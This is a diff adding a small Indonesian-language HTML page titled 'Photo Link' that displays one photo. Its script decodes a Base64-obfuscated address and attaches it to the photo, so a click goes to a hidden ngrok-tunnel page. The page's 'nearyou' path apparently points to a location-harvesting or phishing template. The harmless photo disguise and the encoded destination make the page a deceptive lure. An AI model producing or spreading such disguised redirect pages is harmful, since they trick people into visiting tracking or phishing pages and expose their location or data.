@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Photo Link</title>
+
+    <style>
+      body {
+        margin: 0;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: #111;
+      }
+
+      .photo-link {
+        display: block;
+        cursor: pointer;
+      }
+
+      .photo-link img {
+        width: 400px;
+        max-width: 90vw;
+        border-radius: 12px;
+        display: block;
+        transition: transform 0.2s ease;
+      }
+
+      .photo-link img:hover {
+        transform: scale(1.03);
+      }
+    </style>
+  </head>
+
+  <body>
+    <a id="photoLink" class="photo-link">
+      <img src="foto.jpg" alt="Foto" />
+    </a>
+
+    <script>
+      // URL tujuan dalam Base64
+      const encodedURL =
+        "aHR0cDovL2UzYjItMTE0LTEwLTQyLTIzNi5uZ3Jvay1mcmVlLmFwcC90ZW1wbGF0ZXMvbmVhcnlvdS9pbmRleC5odG1s";
+
+      // Decode Base64
+      const targetURL = atob(encodedURL);
+
+      // Pasang URL ke foto
+      document.getElementById("photoLink").href = targetURL;
+    </script>
+  </body>
+</html>
